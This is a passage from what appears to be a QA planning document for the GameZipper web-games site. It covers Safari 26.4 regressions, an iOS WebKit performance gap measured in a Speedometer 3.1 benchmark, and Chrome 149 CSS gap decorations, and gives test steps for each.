breaks even 1% of games affects thousands of sessions; (e) the 191-fix scope means a manual per-game sweep is impractical — GameZipper needs automated visual-regression baselines captured on Safari 26.3 AND 26.4 to diff the changes. **Test**: (1) capture baseline screenshots of Top-30 games on Safari 26.3 (pre-update) and Safari 26.4 (post-update) — diff the two; any >2% pixel diff requires manual review; (2) run the full Playwright WebKit test suite (cross-reference C-124) on Safari 26.4 — any previously-passing test that now fails is a 26.4 regression; (3) review Apple's WebKit blog post + changelog for the 44 new features — identify any that GameZipper games could adopt (e.g., new CSS property, new JS API) and add a feature-detection guard; (4) identify the 1 deprecated feature — grep GameZipper game code for any usage; if found, plan migration before the feature is removed in Safari 27; (5) monitor GameZipper production analytics for Safari-specific error spikes in the 7 days following the 26.4 rollout (auto-update reaches ~80% of Safari users within 2 weeks). Source: https://so.html5.qq.com/page/real/search_news?docid=70000021_17369c3312871752 (March 25 2026 — "苹果更新Safari 26.4浏览器:回归紧凑标签布局、修复 191 项 BUG" + "共包含 44 项新功能､修复 191 项 BUG 以及废弃 1 项功能")

### 48.2 iOS WebKit Engine Monopoly Performance Penalty 28.6% — Microsoft Speedometer 3.1 Benchmark (June 18 2026)

- [P-080] **[P1]** On June 18 2026, Microsoft engineers published Speedometer 3.1 benchmark data (so.html5.qq.com/page/real/search_news?docid=70000021_8006a3327f492452 + so.html5.qq.com/page/real/search_news?docid=70000021_0366a33aef571652) showing that a Chromium-based browser using Microsoft's own rendering engine scored **28.6% higher than Safari** on iOS (Safari scored ~3635 vs Microsoft's ~4673.68; a 2.1% gap was also measured vs Chrome-on-iOS because all iOS browsers are forced to use Apple's WebKit engine per App Store policy). **Why this is the IOS-WEBKIT-ENGINE-MONOPOLY-PERFORMANCE-PENALTY dimension distinct from P-029 (120Hz game rendering smoothness — display refresh)**: P-029 is display refresh rate; P-080 is the underlying JS/rendering ENGINE performance ceiling imposed by Apple's WebKit-only policy. **Distinct from P-078 (LTPO 1-144Hz variable refresh — display hardware)**: P-078 is display hardware; P-080 is the browser engine. **Distinct from P-041 (WebGPU main-thread unblocking — app-level offload)**: P-041 is application-level; P-080 is platform-level engine monopoly. **Why this matters for GameZipper**: (a) ALL GameZipper iOS users (iPhone + iPad, ~20-25% of traffic) are locked into the WebKit engine which is up to 28.6% slower than what the same hardware could achieve with a competing engine — this means GameZipper games that run at 60fps on Android Chrome may only sustain 45-50fps on iOS Safari even on equivalent hardware; (b) the performance gap is NOT a GameZipper bug — it is an Apple-imposed platform constraint that GameZipper must DESIGN AROUND: game loops must be optimized to hit target frame rates on the SLOWER WebKit engine, not the faster Chromium engine; (c) the gap is worst for compute-heavy games (physics simulations, particle systems, procedural generation) — GameZipper's puzzle games (lighter compute) are less affected, but any future arcade/action game with heavy per-frame computation will hit the WebKit ceiling first on iOS; (d) the EU Digital Markets Act may eventually force Apple to allow competing browser engines on iOS (currently only in the EU, only since iOS 17.4) — GameZipper QA must track whether EU users on third-party-engine iOS browsers see DIFFERENT performance than WebKit-locked users; (e) the 28.6% figure is a 2026 benchmark — the gap may widen or narrow with future WebKit/Chromium releases, requiring periodic re-benchmarking. **Test**: (1) on an iPhone 15 Pro (A17 Pro chip), run a compute-heavy GameZipper game (e.g., a physics-puzzle with 50+ dynamic objects) in Safari iOS — measure average fps over 60 seconds; compare against the same game on a Snapdragon-8-Gen-3 Android phone in Chrome — the iOS Safari fps should be within 30% of the Android Chrome fps; (2) if the gap exceeds 30%, profile the game loop to identify WebKit-specific bottlenecks (e.g., WebKit's slower TypedArray access, WebKit's slower Canvas 2D fillRect for small rects); (3) for EU users, test the same game on an iOS third-party-browser-engine (if available via DMA) and verify performance matches Android Chrome; (4) set the game's target frame rate to 60fps ONLY if WebKit can sustain it — for games where WebKit tops out at 45fps, cap at 45fps on iOS (via `navigator.userAgent` detection) rather than letting it stutter between 45-60; (5) document in the QA runbook that iOS performance benchmarks are the FLOOR, not the target — Android Chrome performance is the ceiling that iOS users cannot reach due to the WebKit monopoly. Source: https://so.html5.qq.com/page/real/search_news?docid=70000021_8006a3327f492452 (June 18 2026 — "微软工程师实测:苹果WebKit限制致iOS浏览器性能损失近三成" + "一款基于 Chromium 且采用微软自有渲染引擎的浏览器在 iOS 系统上的得分比 Safari 高出 28.6%"); https://so.html5.qq.com/page/real/search_news?docid=70000021_0366a33aef571652 (June 18 2026 — "微软工程师测试表明 iOS浏览器因WebKit限制 性能损失高达28.6%" + "Safari的4673.68分,差距约2.1%")

### 48.3 Chrome 149 CSS Gap Decorations — column-rule / row-rule New Feature Adoption (June 2 2026)

- [W-190] **[P2]** Google shipped Chrome 149 on June 2 2026 (so.html5.qq.com/page/real/search_news?docid=70000021_3076a1fbf5420452) introducing **CSS Gap Decorations** — a long-requested CSS feature that lets developers style the gaps between grid/flex items directly via `column-rule` and `row-rule` properties (previously requiring hacks with `border`, pseudo-elements, background images, or complex CSS). The feature also includes `column-rule-inset` / `row-rule-inset` (shrink line endpoints) and `column-rule-visibility-items` / `row-rule-visibility-items` (show lines only between adjacent items). **Why this is the CHROME-149-CSS-GAP-DECORATIONS-NEW-FEATURE-ADOPTION dimension distinct from W-181 (Chrome 148 AI autofill — different Chrome version + different feature class)**: W-181 covers Chrome 148 AI features; W-190 covers Chrome 149 CSS features. **Distinct from W-145 (Safari 27 box-shadow display:table-row bug — bug regression)**: W-145 is a bug; W-190 is a new feature. **Distinct from W-114 (CSS subgrid adoption — different CSS feature)**: W-114 is subgrid; W-190 is gap decorations (complementary, often used together). **Why this matters for GameZipper**: (a) GameZipper's homepage game-grid and category-filter UI use CSS Grid — gap decorations would allow elegant divider lines between game cards WITHOUT extra DOM elements or pseudo-elements, reducing DOM complexity and improving render performance;
